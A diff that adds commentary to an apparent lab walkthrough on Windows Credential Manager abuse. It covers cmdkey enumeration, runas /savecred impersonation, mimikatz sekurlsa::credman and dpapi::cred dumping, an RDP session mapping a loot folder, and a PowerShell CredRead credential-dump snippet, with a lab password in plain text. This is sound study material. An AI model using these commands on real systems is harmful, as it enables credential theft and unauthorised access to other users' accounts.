@@ -36,6 +36,7 @@ Each vault contains a `Policy.vpol` file with AES keys (128 or 256-bit) protecte
 ```cmd
 cmdkey /list
 ```
+> Lists all credentials stored in Windows Credential Manager for the current user. Run this immediately after gaining access — `Domain:interactive=` entries mean you can impersonate that user without their password.
 
 **Output fields:**
 
@@ -53,6 +54,7 @@ cmdkey /list
 ```cmd
 rundll32 keymgr.dll,KRShowKeyMgr
 ```
+> Opens the Stored Usernames and Passwords GUI. Can be used to export credentials to a `.crd` backup file. The backup is encrypted with a user-supplied password.
 Creates `.crd` backup file encrypted with user-supplied password. Can be imported on other systems.
 
 ---
@@ -66,6 +68,7 @@ If `cmdkey /list` shows a `Domain:interactive=` credential:
 ```cmd
 runas /savecred /user:SRV01\mcharles cmd
 ```
+> Spawns a new CMD shell as the target user using their cached credential. `/savecred` tells runas to use stored credentials instead of prompting. No password needed — Windows decrypts the stored credential automatically.
 
 > This spawns a cmd shell as the stored user **without needing their password** (uses the cached credential).
 
@@ -76,6 +79,7 @@ mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # sekurlsa::credman
 ```
+> Dumps all Credential Manager entries from LSASS memory for all currently logged-on users. `privilege::debug` gets SeDebugPrivilege first — required to read LSASS. Results include username, domain, and cleartext password.
 
 Extracts stored credentials (username, domain, cleartext password) from LSASS memory for all logged-on users.
 
@@ -84,6 +88,7 @@ Extracts stored credentials (username, domain, cleartext password) from LSASS me
 ```cmd
 mimikatz # dpapi::cred /in:"C:\Users\<user>\AppData\Local\Microsoft\Credentials\<GUID>"
 ```
+> Reads a specific credential blob from disk and attempts decryption. The GUID is the filename inside the Credentials folder. May require a decrypted DPAPI master key — follow up with `dpapi::masterkey` if this fails.
 
 Then decrypt the master key and use it to reveal the credential.
 
@@ -137,12 +142,14 @@ Then decrypt the master key and use it to reveal the credential.
 ```bash
 xfreerdp /v:10.129.234.171 /u:sadams /p:'totally2brow2harmon@' /drive:share,/tmp/loot /cert:ignore +clipboard
 ```
+> Opens an RDP session with clipboard and a redirected drive. `/drive:share,/tmp/loot` maps the local directory as `\\tsclient\share\` inside the session for file transfers.
 
 ### Step 2 — Enumerate Stored Credentials
 
 ```cmd
 cmdkey /list
 ```
+> Lists saved credentials for the `sadams` session. Look for `Domain:interactive=` entries — these allow impersonation via `runas /savecred`.
 
 **Output:**
 ```
@@ -156,6 +163,7 @@ User: SRV01\mcharles
 ```cmd
 runas /savecred /user:SRV01\mcharles cmd
 ```
+> Opens a new CMD shell as mcharles using the cached credential from Credential Manager. No password prompt.
 
 A new cmd window opens as mcharles — **no password needed** (uses cached credential).
 
@@ -166,6 +174,7 @@ In mcharles' cmd, open PowerShell:
 ```cmd
 powershell
 ```
+> Launches PowerShell from within the mcharles CMD session. The resulting PowerShell session runs as mcharles and can decrypt their own credentials.
 
 Then call CredRead to dump the stored Generic credential:
 
@@ -202,6 +211,7 @@ public class CredManager {
 Add-Type -TypeDefinition $code
 [CredManager]::DumpCred("onedrive.live.com")
 ```
+> Calls the Windows `CredRead` API directly to decrypt and print a stored credential. Works because the session is running as the credential's owner — no admin or Mimikatz needed. Swap `"onedrive.live.com"` for the target name from `cmdkey /list`.
 
 **Output:**
 ```
